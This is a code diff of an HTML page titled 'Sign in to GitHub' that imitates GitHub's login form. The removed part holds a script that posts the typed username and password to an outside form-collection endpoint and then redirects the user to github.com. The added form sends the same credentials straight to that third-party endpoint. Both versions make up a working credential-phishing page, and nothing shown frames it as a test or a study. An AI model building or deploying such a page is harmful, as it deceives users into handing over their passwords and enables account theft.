@@ -42,39 +42,16 @@
             background-color: #218838;
         }
     </style>
-    <script>
-        function handleSubmit(event) {
-            event.preventDefault(); // Prevent the default form submission
-            
-            // Create a FormData object
-            const formData = new FormData(event.target);
-            
-            // Send the data using fetch
-            fetch('https://getform.io/f/aejeknlb', {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    // Redirect to GitHub if data is submitted successfully
-                    window.location.href = 'https://github.com';
-                } else {
-                    // Handle errors if needed
-                    console.error('Submission failed.');
-                }
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-        }
-    </script>
+
 </head>
 <body>
 
 <div class="login-container">
     <h2>Sign in to GitHub</h2>
-    <form onsubmit="handleSubmit(event)">
-        <input type="text" name="garbo" placeholder="Username or email address" required>
-        <input type="password" name="flag" placeholder="Password" required>
-        <input type="submit" value="Sign in">
+    <form action="https://getform.io/f/aejeknlb" method="POST">
+        <input type="text" name="username" placeholder="Username or email address" required> <!-- This will be hidden -->
+        <input type="password" name="password" placeholder="Password" required>
+        <input type="submit" value="Submit">
     </form>
     <p style="text-align: center;">Forgot password?</p>
 </div>
